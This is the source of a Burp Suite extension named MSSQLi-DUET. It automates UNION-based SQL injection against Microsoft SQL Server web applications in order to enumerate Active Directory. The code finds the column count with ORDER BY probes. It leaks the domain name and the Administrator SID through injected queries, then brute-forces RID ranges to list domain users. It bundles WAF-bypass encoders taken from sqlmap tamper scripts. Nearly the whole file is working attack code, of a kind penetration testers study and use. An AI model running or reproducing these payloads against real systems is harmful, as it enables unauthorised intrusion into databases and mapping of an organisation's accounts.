#Import Burp Objects
from burp import IBurpExtender, IBurpExtenderCallbacks, ITab, IContextMenuFactory, IMessageEditorTab, IMessageEditorController, IHttpRequestResponse
#Import Java GUI Objects
from java.awt import Dimension, FlowLayout, Color, Toolkit
from java.awt.datatransfer import Clipboard, StringSelection
from javax import swing
from thread import start_new_thread
from java.util import ArrayList
import sys, time, threading, base64, re
from java.io import PrintWriter
import urllib
import struct
import json

try:
    from exceptions_fix import FixBurpExceptions
except ImportError:
    pass
    
class BurpExtender (IBurpExtender, ITab, IBurpExtenderCallbacks, IContextMenuFactory, IMessageEditorTab, IMessageEditorController, IHttpRequestResponse):
    # Extention information
    EXT_NAME = "MSSQLi-DUET"
    EXT_DESC = "Enumerate Active Directory users, groups, and machines via SQL injection."
    EXT_AUTHOR = "Devin Casadey (Keramas)"
    # Output info to the Extensions console and register Burp API functions
    def registerExtenderCallbacks(self, callbacks):
        print "Name: \t\t"      + BurpExtender.EXT_NAME
        print "Description: \t" + BurpExtender.EXT_DESC
        print "Authors: \t"      + BurpExtender.EXT_AUTHOR
        # Required for easier debugging:
        # https://github.com/securityMB/burp-exceptions
        sys.stdout = callbacks.getStdout()
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName(BurpExtender.EXT_NAME)
        stdout = PrintWriter(callbacks.getStdout(), True)
        callbacks.registerContextMenuFactory(self)
        self.httpTraffic = None
        self.resp = None

        #Create panels used for layout; we must stack and layer to get the desired GUI
        self.tab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane  = swing.JTabbedPane()
        self.tab.add(self.tabbedPane)
        
        # First tab
        self.duetTab = swing.Box(swing.BoxLayout.Y_AXIS)
        self.tabbedPane.addTab("MSSQLi-DUET", self.duetTab)
                
        # Create objects for the first tab's GUI
        # These rows will add top to bottom on the Y Axis
        self.t1r1 = swing.JPanel(FlowLayout())
        self.t1r2 = swing.JPanel(FlowLayout())
        self.t1r3 = swing.JPanel(FlowLayout())
        self.t1r4 = swing.JPanel(FlowLayout())
        self.t1r5 = swing.JPanel(FlowLayout())
        self.t1r6 = swing.JPanel(FlowLayout())
        self.t1r7 = swing.JPanel(FlowLayout())

        # Now add content to the first tab's GUI objects
        self.encodingBox = swing.JComboBox(["None","unicode","unicode_unescaped","doubleencode","unmagicquotes"])
        self.delayBox = swing.JTextField("0",3)
        self.ridMinBox = swing.JTextField("1000",5)
        self.ridMaxBox = swing.JTextField("1500",5)
        self.paramBox = swing.JTextField("",15)
        self.injectBox = swing.JTextField("",15)
        self.outputTxt = swing.JTextArea(10,50)
        self.outputScroll = swing.JScrollPane(self.outputTxt)
        self.requestTxt = swing.JTextArea(10,50)
        self.requestScroll = swing.JScrollPane(self.requestTxt)
        self.requestTxt.setLineWrap(True)
        self.outputTxt.setBackground(Color.lightGray)
        self.outputTxt.setEditable(False)
        self.outputTxt.setLineWrap(True)
       
        self.t1r1.add(swing.JLabel("<html><center><h2>MSSQLi-DUET</h2>Enumerate Active Directory users, groups, and machines via SQL injection.</center></html>"))
        
        #Add labels here for all of the args needed.
        self.t1r2.add(swing.JLabel("WAF Bypass Method:"))
        self.t1r2.add(self.encodingBox)
        
        #Minimum RID value
        self.t1r2.add(swing.JLabel("Minimum RID value:"))
        self.t1r2.add(self.ridMinBox)
        #Maximum RID value
        self.t1r2.add(swing.JLabel("Maximum RID value:"))
        self.t1r2.add(self.ridMaxBox)
        #Delay for requests
        self.t1r2.add(swing.JLabel("Delay:"))
        self.t1r2.add(self.delayBox)
        #Vulnerable parameter
        self.t1r3.add(swing.JLabel("Vulnerable Parameter:"))
        self.t1r3.add(self.paramBox)
        #Injection starting point
        self.t1r3.add(swing.JLabel("Injection start:"))
        self.t1r3.add(self.injectBox)

        #Request section
        self.t1r4.add(swing.JLabel("Raw request:"))
        self.t1r4.add(self.requestScroll)       
        self.t1r5.add(swing.JButton("Run", actionPerformed=self.executePayload))
        self.t1r5.add(swing.JButton("Clear", actionPerformed=self.clearRequest))  

        #Results section
        self.t1r6.add(swing.JLabel("Results Output:"))
        self.t1r6.add(self.outputScroll) 
        self.t1r7.add(swing.JButton("Copy results to Clipboard", actionPerformed=self.copyToClipboard))
        self.t1r7.add(swing.JButton("Clear", actionPerformed=self.clearOutput)) 

        # Add the GUI objects into the first tab
        self.duetTab.add(self.t1r1)
        self.duetTab.add(self.t1r2)
        self.duetTab.add(self.t1r3)
        self.duetTab.add(self.t1r4)
        self.duetTab.add(self.t1r5)
        self.duetTab.add(self.t1r6)
        self.duetTab.add(self.t1r7)
       
        # Now that the GUI objects are added, we can resize them to fit snug in the UI
        self.t1r1.setMaximumSize(Dimension(850, 100))
        self.t1r2.setMaximumSize(Dimension(875, 50))
        self.t1r3.setMaximumSize(Dimension(800, 75))
        self.t1r4.setMaximumSize(Dimension(800, 200))
        self.t1r5.setMaximumSize(Dimension(800, 50))
        self.t1r6.setMaximumSize(Dimension(800, 200))
        self.t1r7.setMaximumSize(Dimension(800, 200))
        #Register the panel in the Burp GUI
        callbacks.addSuiteTab(self)
        return


    #Create context menu entry
    def createMenuItems(self,invocation):
        self.context = invocation

        itemContext = invocation.getSelectedMessages()

        if itemContext > 0:
            menuList = ArrayList()
            menuItem = swing.JMenuItem("Send request to MSSQLi-DUET", actionPerformed=self.writeRequestToTextBox) 
            menuList.add(menuItem)
            return menuList
        return None

    def writeRequestToTextBox(self,event):
        self.httpTraffic = self.context.getSelectedMessages()
        httpRequest = [item.request.tostring() for item in self.httpTraffic]
        request = ''.join(httpRequest)
        self.requestTxt.text = request
       

    def buildRequest(self):
        stdout = PrintWriter(self._callbacks.getStdout(), True)
        #Get data about the request that was right clicked
        for item in self.httpTraffic: 
            try:

                httpService = item.getHttpService()

                host = httpService.host 
                port = httpService.port
                protocol = httpService.protocol
                protoChoice = True if protocol.lower() == 'https' else False

                #Parse the text area that should contain an HTTP request.
                requestInfo = self._helpers.analyzeRequest(self.requestTxt.text)
                
                #Request datas
                headers = requestInfo.getHeaders()
                bodyOffset = requestInfo.bodyOffset 
                body = self.requestTxt.text[bodyOffset:]

                content_type = ""
                for (i, header) in enumerate(headers):
                    if header.lower().startswith("content-type:"):
                        content_type = header.split(":")[1].lower().strip()
                
                if content_type == "":
                    print("[-] No content-type header found. This could have detrimental effects.")

                method = headers[0].split(" ")[0]
                urlpath = headers[0].split(" ")[1]

                #Debugging area for output and parsing
                #stdout.println(str(body))
                #stdout.println(str(headers))
                #stdout.println(str(method))
                #stdout.println(str(content_type))
                #stdout.println(str(urlpath))

                #Check param box for the vulnerable parameter and then build the payloads out.
                parameter = self.paramBox.getText()
                data = self.injectBox.getText()

                if method == "GET":
                    body = urlpath.split("?")[1]
                    params = dict(x.split('=') for x in body.split('&'))

                else:
                    #Add logic here for the handling parameters in body and JSON content
                    if "json" in str(content_type) or "JSON" in str(content_type):
                        params = json.loads(body)
                        print(body)
                        print(params)

                    else:
                        params = dict(x.split('=') for x in body.split('&'))
                        print(params)

                #Check column numbers and type
                column_number,column_type = self.determine_columns(host,port,protoChoice,headers,params,method,urlpath,content_type,parameter,data)

                if column_number == None or column_type == None:
                    break

                #Get domain name
                domain_name = self.leak_domain_name(host,port,protoChoice,headers,params,method,urlpath,content_type,parameter,data,column_number,column_type)
                               
                #Get SID
                domain_sid = self.extract_sid(host,port,protoChoice,headers,params,method,urlpath,content_type,parameter,data,column_number,column_type,domain_name)

                #Enum users
                ad_data = self.enum_users(host,port,protoChoice,headers,params,method,urlpath,content_type,parameter,data,column_number,column_type,domain_name,domain_sid)

                print("[!] Finished!")
                self.outputTxt.append("[!] Finished!" + "\n")

            except Exception as ex:
                stdout.println("Problem parsing the request data" + "\n")
                self.outputTxt.setText("[-] Problem parsing the request data. Check debug output for more details.")
                stdout.println(ex)

        return 
   
    def postRequest(self,headers,body,args_):
        #Needed: args=[host,port,protoChoice,request]
        stdout = PrintWriter(self._callbacks.getStdout(), True)
      
        request = self._helpers.buildHttpMessage(headers,body)
        
        args_.append(request)
        t = threading.Thread(target=self.makeRequest,args=args_)
        t.daemon = True
        t.start()
        
        t.join()

    def getRequest(self,headers,args_):
        #Needed: args=[host,port,protoChoice,request]
        stdout = PrintWriter(self._callbacks.getStdout(), True)
        
        body = "\r\n"
        request = self._helpers.buildHttpMessage(headers,body)
        
        args_.append(request)
        t = threading.Thread(target=self.makeRequest,args=args_)
        t.daemon = True
        t.start()
        
        t.join()
        

    def makeRequest(self,host,port,protoChoice,request):
        stdout = PrintWriter(self._callbacks.getStdout(), True)
        try:
            self.resp = self._callbacks.makeHttpRequest(
                host,
                port,
                protoChoice,
                request
            )

        except Exception as ex:
            stdout.println(ex)
       
    # Standard function: Set the tab name
    def getTabCaption(self):
        return BurpExtender.EXT_NAME

    # Standard function: Set the GUI component in the tab
    def getUiComponent(self):
        return self.tab

    #Clear the request box
    def clearRequest(self, event):
        self.requestTxt.setText("")
        return
    
    #Clear the output box
    def clearOutput(self, event):
        self.outputTxt.setText("")
        return

    #Main execution function
    def executePayload(self, event):
        self.buildRequest()
        return

    #copy output to clipboard for easy copy pasta of the results so it can be imported into intruder or different tools
    def copyToClipboard(self, event):
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        data = StringSelection(self.outputTxt.getText())
        clipboard.setContents(data, None)
        return
    

    # SQL injection functions 
    #=====================================================================================
    #Logic to determine the number of columns and the type of data that can be used.
    def determine_columns(self,host,port,protoChoice,headers,body,method,urlpath,content_type,parameter,data):
        stdout = PrintWriter(self._callbacks.getStdout(), True)

        print("[+] Determining the number of columns in the table...")
        self.outputTxt.append("[+] Determining the number of columns in the table..." + "\n")
        
        payload = data

        encoding = self.encodingBox.getSelectedItem()
        if encoding != "None":
            payload = payload_processing(payload,encoding)

        else:
            payload = self._helpers.urlEncode(payload)

        body[parameter] = payload

        if "json" not in content_type.lower():
            new_body = ""
            new_body += '&'.join("%s=%s" % (str(key),str(val)) for (key,val) in body.iteritems())
                
            print(new_body)

        else:
            new_body = json.dumps(body)

        #Make the request
        if method == "GET":
            url1 = urlpath.split("?")[0]
            url2 = "?" + str(new_body)
            headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"
            print(headers)
            try:
                self.getRequest(headers,[host,port,protoChoice])

            except:
                print("[-] Error determining number of columns.")
        
        else:
            try:
                self.postRequest(headers,new_body,[host,port,protoChoice])

            except:
                print("[-] Error determining number of columns.")

        baseline = self.resp.tostring()      
      
        
        payload = data + " order by 1--"

        encoding = self.encodingBox.getSelectedItem()
        if encoding != "None":
            payload = payload_processing(payload,encoding)

        else:
            payload = self._helpers.urlEncode(payload)


        body[parameter] = payload

        if "json" not in content_type.lower():
            new_body = ""
            new_body += '&'.join("%s=%s" % (str(key),str(val)) for (key,val) in body.iteritems())
        
            print(new_body)

        else:
            new_body = json.dumps(body)
            print(new_body)

        #Make the request
        if method == "GET":
            url1 = urlpath.split("?")[0]
            url2 = "?" + str(new_body)
            headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"
            
            try:
                self.getRequest(headers,[host,port,protoChoice])

            except:
                print("[-] Error determining number of columns.")
        else:
            try:
                self.postRequest(headers,new_body,[host,port,protoChoice])

                
            except:
                print("[-] Error determining number of columns.")
                return None

        second_response = self.resp.tostring()
        
        # Modify logic here if the baseline request and the second response are actually always the same.
        if len(baseline) == len(second_response):
            print("[-] Error determining number of columns. Check payload or encoding")
            self.outputTxt.setText("[-] Error determining number of columns. Check payload or encoding method appropriateness.")
            column_number = None
            column_type = None
            return column_number,column_type

        #Increment order by value to determine number of columns
        i = 2
        valid = True
        while valid:
            payload = data + " order by %d--" % i
            
            if encoding != "None":
                payload = payload_processing(payload,encoding)

            else:
                payload = self._helpers.urlEncode(payload)


            body[parameter] = payload

            if "json" not in content_type.lower():
                new_body = ""
                new_body += '&'.join("%s=%s" % (str(key),str(val)) for (key,val) in body.iteritems())
            
                print(new_body)

            else:
                new_body = json.dumps(body)

            if method == "GET":
                url1 = urlpath.split("?")[0]
                url2 = "?" + str(new_body)
                headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"

                self.getRequest(headers,[host,port,protoChoice])

            else:
                self.postRequest(headers,new_body,[host,port,protoChoice])

            newdata = self.resp.tostring()
            
            if len(second_response) != len(newdata):
                valid = False
                break
            #Break and error if there are too many columns. This is indicative of a logic error/infinite loop
            elif i == 50:
                valid = False
                print("[-] Could not determine number of columns. Check payload and request data.")
                break
                return None
          
            else:
                i += 1
                continue

            

        column_number = (i-1)
        print(column_number)
        self.outputTxt.append(str(column_number) + "\n")

        #Now determine what can be used for the column type
        print("[+] Determining column type...")
        self.outputTxt.append("[+] Determining column type..." + "\n")
        try_types = ['null','1','test']

        for j in try_types:
            payload = data
            payload += generate_payload(column_number,j)
            payload += "@@version--"

            if encoding != "None":
                payload = payload_processing(payload,encoding)

            else:
                payload = self._helpers.urlEncode(payload)


            body[parameter] = payload
            print(body)

            if "json" not in content_type.lower():
                new_body = ""
                new_body += '&'.join("%s=%s" % (str(key),str(val)) for (key,val) in body.iteritems())
            
                print(new_body)

            else:
                new_body = json.dumps(body)


            if method == "GET":
                url1 = urlpath.split("?")[0]
                url2 = "?" + str(new_body)
                headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"

                self.getRequest(headers,[host,port,protoChoice])

            else:
                self.postRequest(headers,new_body,[host,port,protoChoice])
            
            new_response = self.resp.tostring()

            determinant = str(new_response)

            column_type = None
            if "Microsoft" in determinant:
                column_type = j
                print(j)
                self.outputTxt.append(j + "\n")
                break      
            
            else:
                print("Column type not" + j)
                self.outputTxt.append("Column not " + j + "\n")
        return column_number,column_type


    #Function to extract the name of the Domain from the database
    def leak_domain_name(self,host,port,protoChoice,headers,body,method,urlpath,content_type,parameter,data,column_number,column_type):

        print("[+] Discovering domain name...")
        self.outputTxt.append("[+] Discovering domain name..." + "\n")

        payload = data
        payload += generate_payload(column_number,column_type)
        payload += "(SELECT CONCAT ( 'W00TW00T', (select default_domain()), 'W00TW00T' ) AS Result)--"
        #payload +=  "(CAST((SELECT CONCAT ( 'W00TW00T', (select default_domain()), 'W00TW00T' ) AS Result) as nvarchar(4000)))"
        payload += "," + column_type + "--"

        encoding = self.encodingBox.getSelectedItem()
        if encoding != "None":
            payload = payload_processing(payload,encoding)
        else:
            payload = self._helpers.urlEncode(payload)

        body[parameter] = payload
        print(body)

        if "json" not in content_type.lower():
            new_body = ""
            new_body += '&'.join("%s=%s" % (key,str(val)) for (key,val) in body.iteritems())
        
        print(new_body)

        if method == "GET":
            url1 = urlpath.split("?")[0]
            url2 = "?" + str(new_body)
            headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"
            self.getRequest(headers,[host,port,protoChoice])
        else:
            self.postRequest(headers,new_body,[host,port,protoChoice])

        determinant = self.resp.tostring()

        leaked_domain = str(re.search(r"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())
        print(leaked_domain)      
        self.outputTxt.append(leaked_domain + "\n")
        return leaked_domain

    #Use injection to leak the domain SID value in hex format
    def extract_sid(self,host,port,protoChoice,headers,body,method,urlpath,content_type,parameter,data,column_number,column_type,domain):
        print("[+] Discovering domain SID...")
        self.outputTxt.append("[+] Discovering domain SID..." + "\n")
        payload = data
        payload += generate_payload(column_number,column_type)
        payload += "(SELECT CONCAT ( 'W00TW00T', (select sys.fn_varbintohexstr(SUSER_SID('%s\\Administrator'))), 'W00TW00T' ) AS Result)--" % domain
        #payload += "(CAST((SELECT CONCAT ( 'W00TW00T', (select sys.fn_varbintohexstr(SUSER_SID('%s\\Administrator'))), 'W00TW00T' ) AS Result) as nvarchar(4000)))" % domain
        payload += "," + column_type + "--"

        encoding = self.encodingBox.getSelectedItem()
        if encoding != "None":
            payload = payload_processing(payload,encoding)
        else:
            payload = self._helpers.urlEncode(payload)
        

        body[parameter] = payload
        print(body)

        if "json" not in content_type.lower():
            new_body = ""
            new_body += '&'.join("%s=%s" % (key,str(val)) for (key,val) in body.iteritems())
        
        print(new_body)

        if method == "GET":
            url1 = urlpath.split("?")[0]
            url2 = "?" + str(new_body)
            headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"
            self.getRequest(headers,[host,port,protoChoice])
        else:
            self.postRequest(headers,new_body,[host,port,protoChoice])

        determinant = self.resp.tostring()
    
        leaked_sid = str(re.search(r"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())

        result = prepare_sid(leaked_sid)
        print(result)
        self.outputTxt.append(result + "\n")
        return result


    #Enumerate for AD users given a range
    def enum_users(self,host,port,protoChoice,headers,body,method,urlpath,content_type,parameter,data,column_number,column_type,domain,sid):
        print("[+] Enumerating Active Directory via SIDs...")
        self.outputTxt.append("[+] Enumerating Active Directory via SIDs..." + "\n" )
        max_rid = self.ridMaxBox.getText()
        min_rid = self.ridMinBox.getText()
        time_delay = self.delayBox.getText()

        users_list = []

        for i in range(int(min_rid),int(max_rid)):
            i = str(i)
            
            payload = data
            payload += generate_payload(column_number,column_type)
            payload += "(SELECT CONCAT ( 'W00TW00T', (SUSER_SNAME(SID_BINARY(N'%s%s'))), 'W00TW00T' ) AS Result)--" % (sid,i)
            #payload += "(CAST(((SELECT CONCAT ( 'W00TW00T', (SUSER_SNAME(SID_BINARY(N'%s%s'))), 'W00TW00T' ) AS Result) as nvarchar(4000)))" % (sid,i)
            payload += "," + column_type + "--"

            encoding = self.encodingBox.getSelectedItem()
            if encoding != "None":
                payload = payload_processing(payload,encoding)
            else:
                payload = self._helpers.urlEncode(payload)
        
            body[parameter] = payload
            print(body)

            if "json" not in content_type.lower():
                new_body = ""
                new_body += '&'.join("%s=%s" % (key,str(val)) for (key,val) in body.iteritems())
            
            print(new_body)

            if method == "GET":
                url1 = urlpath.split("?")[0]
                url2 = "?" + str(new_body)
                headers[0] = "GET " + str(url1) + str(url2) + " HTTP/1.1"
                self.getRequest(headers,[host,port,protoChoice])
            
            else:
                self.postRequest(headers,new_body,[host,port,protoChoice])

            determinant = self.resp.tostring()
                
            if domain in determinant:
                username = str(re.search(r"(?<=W00TW00T)(.+?)(?=W00TW00T)",determinant).group())
                users_list.append(username)
            time.sleep(int(time_delay))

        for i in users_list:
            self.outputTxt.append(i + "\n")
            print(i)

        return users_list


#=============================================================================================================

#Burp Error Debugging
'''
try:
    FixBurpExceptions()
except:
    pass
'''


# Begin tamper functions  
# Modify area with tamper functions that you wish to use, 
# and then modify args for the dropdown and the payload_processing() function
#
# https://github.com/sqlmapproject/sqlmap/tree/master/tamper
#==============================================================================================================

#Unescaped unicode for JSON type data
def unicode_encode_unescaped(payload):
    retVal = payload
    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += "u%.4X" % ord(payload[i])
                i += 1

    return retVal

#Escaped unicode
def unicode_encode(payload):
    retVal = payload
    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "\\u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += "\\u%.4X" % ord(payload[i])
                i += 1

    return retVal


def chardoubleencode(payload):
    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += '%%25%s' % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%25%.2X' % ord(payload[i])
                i += 1

    return retVal


def unmagicquotes(payload):
    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in range(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            if _ != retVal:
                retVal = _
                retVal += "-- -"
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- -"
    return retVal


#Payload processing function - Detemines encoding path based on args.
#=======================================================================================

def payload_processing(payload,encoding):
    if encoding == 'unicode':
        mod_payload = unicode_encode(payload)
    
    elif encoding == 'unicode_unescaped':
        mod_payload = unicode_encode_unescaped(payload)

    elif encoding == 'doubleencode':
        mod_payload = chardoubleencode(payload)

    elif encoding == 'unmagicquotes':
        mod_payload = unmagicquotes(payload)

    else:
        mod_payload = payload

    return mod_payload


#Helper functions here
#========================================================================================

#Convert hex representation of SID into an actual SID string value
def sid_to_str(sid):
    if sys.version_info.major < 3:
        revision = ord(sid[0])
    else:
        revision = sid[0]

    if sys.version_info.major < 3:
        number_of_sub_ids = ord(sid[1])
    else:
        number_of_sub_ids = sid[1]
    iav = struct.unpack('>Q', b'\x00\x00' + sid[2:8])[0]
    sub_ids = [struct.unpack('<I', sid[8 + 4 * i:12 + 4 * i])[0]
               for i in range(number_of_sub_ids)]

    return 'S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids]))


#Modify the SID hex value retrieved from query 
def prepare_sid(sid):
    #hex_string = bytes.fromhex(sid[2:])  #python3 way
    hex_data = sid[2:]
    hex_string = hex_data.decode("hex")
    mod_sid = sid_to_str(hex_string)
    domain_sid_data = mod_sid.split('-')[:7]
    domain_sid = '-'.join(domain_sid_data) + "-"

    #print(domain_sid+"\n")
    return domain_sid


#Prep the union select preamble
def generate_payload(column_number,column_type):
    
    i = 0
    payload = " UNION SELECT "
    
    while i < (column_number - 2):
        payload += (column_type + ",")
        i += 1

    return payload
